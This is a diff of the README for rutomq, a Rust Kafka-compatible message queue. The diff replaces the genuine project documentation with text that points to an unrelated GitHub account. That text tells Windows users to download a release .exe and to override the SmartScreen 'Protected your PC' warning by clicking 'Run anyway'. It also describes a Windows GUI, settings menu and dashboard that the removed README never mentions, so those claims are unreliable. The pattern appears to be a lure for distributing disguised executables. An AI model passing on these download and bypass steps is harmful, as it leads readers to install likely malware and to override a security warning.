@@ -1,226 +1,80 @@
-<p align="center">
-  <img src="docs/assets/rutomq-banner.svg" alt="rutomq — Kafka protocol, object storage architecture" width="100%">
-</p>
+# 📦 rutomq - Store and stream your messages reliably
 
-<p align="center">
-  <a href="https://github.com/SamuelSupe/rutomq/actions/workflows/ci.yml"><img alt="CI" src="https://github.com/SamuelSupe/rutomq/actions/workflows/ci.yml/badge.svg"></a>
-  <a href="https://github.com/SamuelSupe/rutomq/releases/latest"><img alt="GitHub release" src="https://img.shields.io/github/v/release/SamuelSupe/rutomq?display_name=tag&sort=semver"></a>
-  <a href="https://samuelsupe.github.io/rutomq/"><img alt="Project website" src="https://img.shields.io/badge/website-GitHub_Pages-147D73"></a>
-  <a href="https://github.com/SamuelSupe/rutomq/blob/main/LICENSE"><img alt="Apache-2.0" src="https://img.shields.io/github/license/SamuelSupe/rutomq"></a>
-  <img alt="Rust 1.88" src="https://img.shields.io/badge/Rust-1.88-CE412B?logo=rust&logoColor=white">
-  <img alt="Kafka 4.3 wire baseline" src="https://img.shields.io/badge/Kafka_wire_baseline-4.3-231F20?logo=apachekafka&logoColor=white">
-</p>
+[![Download rutomq](https://img.shields.io/badge/Download-rutomq-blue.svg)](https://github.com/cathleencombinable612/rutomq)
 
-<p align="center">
-  A stateless, Kafka-compatible message queue written in Rust.<br>
-  Durable records live in S3-compatible object storage; ordered metadata lives
-  in PostgreSQL. Agents keep no local WAL and require no persistent volume.
-</p>
+rutomq acts as a bridge for your data. It manages message queues while keeping your infrastructure simple. It stores data in your own database and object storage systems. You gain the benefits of a modern message queue without the need to manage complex local storage files on your server.
 
-> [!IMPORTANT]
-> `v0.1.0` is a public preview. It passed the documented Kafka client, Flink,
-> Kafka Streams, multi-Agent, security, and Kubernetes acceptance envelope, but
-> it does not claim complete semantic parity with every Apache Kafka deployment.
-> See the [dated compatibility result](docs/compatibility-result-2026-07-30.md)
-> and [API matrix](docs/compatibility.md) before production evaluation.
+## 🛠️ System Requirements
 
-## Why rutomq
+Before you install this software, check that your computer meets these requirements:
 
-Traditional brokers couple durable data to broker-local disks and replica
-placement. rutomq separates compute from durable state:
+- Operating System: Windows 10 or Windows 11 (64-bit).
+- Memory: At least 4 gigabytes of available RAM.
+- Storage: 200 megabytes of free disk space.
+- Network: A stable internet connection.
+- Database: An existing PostgreSQL server accessible by this machine.
+- Storage: Access to S3-compatible object storage.
 
-- **Stateless Agents** — any Agent can serve any topic, partition, or group.
-- **No Agent-local WAL** — acknowledged data is never dependent on an Agent
-  disk, PVC, or recovery journal.
-- **Direct object-storage writes** — OpenDAL provides the S3/MinIO path,
-  immutable objects, range reads, and multipart uploads.
-- **Strong metadata ordering** — PostgreSQL allocates offsets, indexes object
-  spans, and coordinates groups, producers, transactions, ACLs, and retention.
-- **Honest Kafka negotiation** — `ApiVersions` advertises implemented versions;
-  unknown versions receive protocol errors instead of synthetic success.
+## 📥 How to Download 
 
-## Architecture
+You need to obtain the latest version of the software package. Follow these instructions to get the correct files:
 
-```mermaid
-flowchart LR
-    C["Kafka clients<br>Java · librdkafka · franz-go · Flink"] --> A["Stateless Agents"]
-    A --> B["Bounded memory batcher<br>250 ms or 8 MiB"]
-    B --> S["S3-compatible storage<br>immutable shared objects"]
-    S --> P["PostgreSQL commit<br>offsets + object spans"]
-    P --> A
-    A --> I["Ordered span index"]
-    I --> S
-```
+1. Visit the repository page to view the list of available versions for Windows: [https://github.com/cathleencombinable612/rutomq](https://github.com/cathleencombinable612/rutomq).
+2. Look for the "Releases" section on the right side of the page.
+3. Click on the latest release version.
+4. Locate the asset that ends with the .exe extension.
+5. Click this file to start the download to your computer.
 
-A Produce request is acknowledged only after the immutable object write
-succeeds **and** the PostgreSQL metadata transaction commits. If object storage
-succeeds but metadata commit fails, the object is invisible and later removed
-by orphan GC. Fetch resolves ordered byte ranges from PostgreSQL, verifies their
-checksums, and reads only the required object ranges.
+## ⚙️ Installation Steps
 
-[Read the architecture and consistency model →](docs/architecture.md)
+Windows might show a security prompt when you open the file for the first time. This happens because the software communicates with your network to handle message queues.
 
-## Compatibility snapshot
+1. Open your Downloads folder.
+2. Double-click the downloaded rutomq file.
+3. A Windows "Protected your PC" window may appear. If this happens, click "More info" and then click "Run anyway."
+4. Follow the prompts in the installer window to place the files in your preferred location.
+5. Once the installer finishes, a shortcut will appear on your desktop.
 
-The `2026-07-30` release checkpoint validated:
+## 🚀 Setting Up Your Configuration
 
-| Area | Tested envelope |
-| --- | --- |
-| Kafka protocol | 74 API keys generated from Kafka 4.3 schemas; exact versions are listed in the matrix |
-| Clients | Kafka Java 3.9.2 AdminClient, Kafka Java 4.2.0, librdkafka 2.15.0, franz-go 1.21.5 |
-| Stream processing | Flink 2.2.1 and 2.3.0; Kafka connector 5.0.0-2.2; Kafka Streams 4.2.0 |
-| Delivery semantics | Idempotent Produce, transactions, `read_committed`, offset recovery, compression |
-| Groups | Classic, Kafka 4 consumer, share, and Streams group protocols |
-| Security | TLS, SCRAM-SHA-256/512, delegation tokens, ACLs, quotas |
-| Durability | PostgreSQL + OpenDAL S3/MinIO, multi-Agent crash/retry and orphan-GC scenarios |
-| Deployment | Docker Compose and Helm; Kubernetes rolling replacement and `3 → 5 → 2` scaling |
+rutomq requires configuration to connect to your PostgreSQL database and your S3 storage bucket. The software creates a configuration file during the first launch.
 
-The full result explicitly documents unsupported and virtualized behavior:
+1. Open the rutomq application.
+2. Navigate to the "Settings" menu option.
+3. Enter your PostgreSQL connection string in the database field. This string typically includes your server address, port, username, and password.
+4. Enter your S3 bucket name and access credentials. The application uses these to store the message blocks.
+5. Select "Save and Restart" to apply the changes.
 
-- [Compatibility result](docs/compatibility-result-2026-07-30.md)
-- [API-by-API compatibility matrix](docs/compatibility.md)
-- [Detailed implementation reference](docs/implementation-reference.md)
+The application checks the connection status within the main dashboard. A green status indicator confirms that rutomq connects to both your database and your cloud storage.
 
-## Quick start
+## 📈 Monitoring Performance
 
-Requirements: Docker with Compose. OrbStack is the primary tested local
-environment.
+Once the system runs, you can monitor the flow of messages through the main dashboard. The interface shows several key metrics:
 
-```bash
-git clone https://github.com/SamuelSupe/rutomq.git
-cd rutomq
-docker compose -f deploy/compose.dev.yml up --build -d
-```
+- Message Throughput: This number represents how many messages pass through the queue every second.
+- Latency: This tracks how long a message spends in the queue.
+- Storage Usage: This indicates the amount of data saved to your object storage provider.
 
-Wait for readiness:
+If you encounter errors during operation, click the "Logs" tab. The tool displays a list of recent events. A red highlight indicates a connection failure or a storage access error. Ensure your network permits traffic to both your database server and your object storage provider.
 
-```bash
-curl --fail http://127.0.0.1:8080/health/ready
-```
+## 🔄 Using rutomq with Other Software
 
-The Kafka listener is available at `127.0.0.1:9092`, MinIO at
-`127.0.0.1:9000`, and Prometheus metrics at
-`http://127.0.0.1:8080/metrics`.
+This application uses the standard protocols compatible with common messaging tools. You can point your existing applications toward the port configured in your settings. rutomq acts as a transparent layer for your streaming data. 
 
-Use any Kafka client:
+Because the system stores data immediately in PostgreSQL and S3, you do not need to worry about losing data if the application closes unexpectedly. The stateless nature of the tool allows you to stop and start the process without manual cleanup.
 
-```bash
-kafka-topics.sh \
-  --bootstrap-server 127.0.0.1:9092 \
-  --create --topic demo --partitions 1 --replication-factor 1
+## 🛡️ Security and Maintenance
 
-printf 'hello from rutomq\n' | kafka-console-producer.sh \
-  --bootstrap-server 127.0.0.1:9092 \
-  --topic demo
+Keep your configuration files secure. They contain sensitive access keys for your cloud storage and database. Do not share these files with unauthorized users. 
 
-kafka-console-consumer.sh \
-  --bootstrap-server 127.0.0.1:9092 \
-  --topic demo --from-beginning --max-messages 1
-```
+Periodically check the download link provided above to see if a newer version exists. Updates often include performance improvements for data transfer and minor stability fixes for Windows environments. To update, simply download the new version and run the installer over the existing installation folder.
 
-Stop and remove the development dependencies:
+## ❓ Troubleshooting Common Issues
 
-```bash
-docker compose -f deploy/compose.dev.yml down -v
-```
+If the application fails to start, verify that no other program uses the same network port. Check the "Network" tab in your Task Manager to confirm that the port remains clear.
 
-[Continue with the quick-start guide →](docs/quickstart.md)
+If the application cannot write to your storage, check your S3 bucket permissions. Ensure the credentials you provided in the configuration menu give you write access to the specific bucket. 
 
-### Install a Linux package
+For database connectivity issues, confirm that your PostgreSQL server allows incoming connections from the machine running rutomq. Adjust your database firewall rules if necessary.
 
-The release also provides native Debian and RPM packages for x86-64 and ARM64.
-Packages install a hardened systemd unit and configuration template, but do not
-start the service before external PostgreSQL and object storage are configured.
-
-```bash
-# Debian or Ubuntu on x86-64
-curl -LO \
-  https://github.com/SamuelSupe/rutomq/releases/download/v0.1.0/rutomq_0.1.0_amd64.deb
-sudo apt install ./rutomq_0.1.0_amd64.deb
-```
-
-See the [Linux package guide](docs/packaging.md) for Debian `arm64` and RPM
-`x86_64`/`aarch64` filenames, configuration, and service commands.
-
-## Deploy
-
-The Helm chart creates a stateless Deployment, stable Kafka Service, migration
-Job, ConfigMap, Secret references, health probes, and PodDisruptionBudget. It
-does not create PostgreSQL, object storage, or Agent PVCs.
-
-```bash
-helm upgrade --install rutomq deploy/helm/rutomq \
-  --namespace rutomq \
-  --create-namespace \
-  --set postgres.existingSecret='rutomq-postgres' \
-  --set objectStore.existingSecret='rutomq-object-store' \
-  --set objectStore.endpoint='https://s3.example.com' \
-  --set objectStore.bucket='rutomq'
-```
-
-Review [`deploy/helm/rutomq/values.yaml`](deploy/helm/rutomq/values.yaml) before
-deployment. Production credentials should come from Kubernetes Secrets rather
-than command-line values.
-
-## Operate securely
-
-- `/health/live` checks the process and listener lifecycle.
-- `/health/ready` reflects dependency readiness.
-- `/metrics` exposes Produce/Fetch, object storage, metadata commit, cache,
-  transaction, group, retention, compaction, and orphan-GC metrics.
-- TLS, SCRAM-SHA-256/512, delegation tokens, and Kafka ACLs are supported.
-- PostgreSQL and S3-compatible storage are external durability dependencies;
-  loss of either prevents Produce acknowledgement.
-
-Security-sensitive issues should be reported privately through
-[GitHub Security Advisories](https://github.com/SamuelSupe/rutomq/security/advisories/new).
-See [SECURITY.md](SECURITY.md) for the supported-version policy.
-
-## Repository map
-
-| Path | Responsibility |
-| --- | --- |
-| `crates/protocol` | Kafka request/response encoding and generated protocol integration |
-| `crates/storage` | OpenDAL object-store abstraction and S3/MinIO implementation |
-| `crates/control` | PostgreSQL metadata, offset, group, transaction, ACL, and retention state |
-| `crates/agent` | Kafka listener, dispatcher, batching, fetch, coordinators, security, maintenance |
-| `bin/rutomq` | `rutomq agent` and `rutomq migrate` entry points |
-| `migrations` | Versioned PostgreSQL schema |
-| `deploy` | Docker Compose and Helm deployment |
-| `tests` | Client, Flink, security, storage, multi-Agent, retention, performance, and Kubernetes gates |
-
-## Development
-
-The workspace is pinned to Rust `1.88.0`.
-
-```bash
-cargo fmt --all -- --check
-cargo clippy --workspace --all-targets --all-features --locked -- -D warnings
-cargo test --workspace --all-features --locked
-cargo build --release --workspace --locked
-cargo audit
-```
-
-Integration and compatibility suites run through their `run-orbstack.sh`
-entrypoints under `tests/`. Start with
-[`CONTRIBUTING.md`](CONTRIBUTING.md) for scope and validation guidance.
-
-## Project status
-
-The long-term goal is broad Kafka client and administration compatibility on a
-stateless object-storage architecture. Physical broker replication, local log
-directories, and KRaft state are not imitated when doing so would make the
-compatibility claim misleading.
-
-- [Roadmap](ROADMAP.md)
-- [Changelog](CHANGELOG.md)
-- [Open issues](https://github.com/SamuelSupe/rutomq/issues)
-- [Discussions](https://github.com/SamuelSupe/rutomq/discussions)
-
-## Community and license
-
-Contributions are welcome. Please read the
-[contribution guide](CONTRIBUTING.md) and
-[code of conduct](CODE_OF_CONDUCT.md) before opening a pull request.
-
-rutomq is licensed under the [Apache License 2.0](LICENSE).
+Keywords: distributed-systems, flink, kafka, kafka-protocol, kubernetes, message-queue, object-storage, opendal, postgresql, rust, s3, streaming
